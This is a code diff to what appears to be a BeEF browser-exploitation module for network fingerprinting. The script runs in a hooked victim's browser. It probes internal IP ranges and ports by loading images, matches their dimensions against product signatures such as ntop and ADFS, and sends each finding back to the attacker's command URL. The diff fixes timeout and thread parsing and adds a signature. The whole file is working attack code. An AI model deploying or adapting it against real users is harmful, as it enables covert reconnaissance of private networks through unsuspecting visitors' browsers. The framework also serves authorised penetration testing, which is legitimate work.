@@ -9,9 +9,9 @@ beef.execute(function() {
   var ips = new Array();
   var ipRange = "<%= @ipRange %>";
   var ports   = "<%= @ports %>";
-  var timeout = "<%= @timeout %>";
-  var wait = "<%= @wait %>";
-  var threads = "<%= @threads %>";
+  var threads = parseInt("<%= @threads %>", 10);
+  var timeout = parseInt("<%= @timeout %>", 10)*1000;
+  var wait    = parseInt("<%= @wait %>", 10)*1000;
 
   if (ports != null) {
     ports = ports.split(',');
@@ -265,6 +265,7 @@ beef.execute(function() {
   new Array("ntop","3000","http",false,"/ntop_logo.png",103,50)
 
 // Uncommon signatures
+//new Array("Microsoft ADFS","80","http",false,"/adfs/portal/illustration/illustration.png",1420,1080),
 //new Array("Rejetto HttpFileServer", "8080", "http",i true, "/~img27",16,16),
 //new Array("Citrix MetaFrame", "80", "http", false, "/Citrix/MetaFrameXP/default/media/nfusehead.gif",230,41),
 //new Array("Oracle E-Business Suite","80","http",false,"/OA_MEDIA/FNDSSCORP.gif",134,31),
@@ -291,7 +292,7 @@ beef.execute(function() {
     img.onerror = function() { dom.removeChild(this); }
     img.onload = function() {
       if (this.width == urls[this.id][5] && this.height == urls[this.id][6]) {
-        beef.net.send('<%= @command_url %>', <%= @command_id %>,'proto='+proto+'&ip='+ip+'&port='+port+'&discovered='+signature_name+"&url="+escape(this.src));dom.removeChild(this);
+        beef.net.send('<%= @command_url %>', <%= @command_id %>,'proto='+proto+'&ip='+ip+'&port='+port+'&discovered='+signature_name+"&url="+escape(this.src), beef.are.status_success());dom.removeChild(this);
         beef.debug("[Network Fingerprint] Found [" + signature_name + "] with URL [" + escape(this.src) + "]");
       }
     }
@@ -304,7 +305,7 @@ beef.execute(function() {
         dom.contentWindow.document.execCommand("Stop", false);
       }
       document.body.removeChild(dom);
-    }, timeout*1000);
+    }, timeout);
   }
 
   WorkerQueue = function(frequency) {
@@ -338,7 +339,7 @@ beef.execute(function() {
   // create worker queue
   var workers = new Array();
   for (w=0; w < threads; w++) {
-    workers.push(new WorkerQueue(wait*1000));
+    workers.push(new WorkerQueue(wait));
   }
 
   // for each URI signature
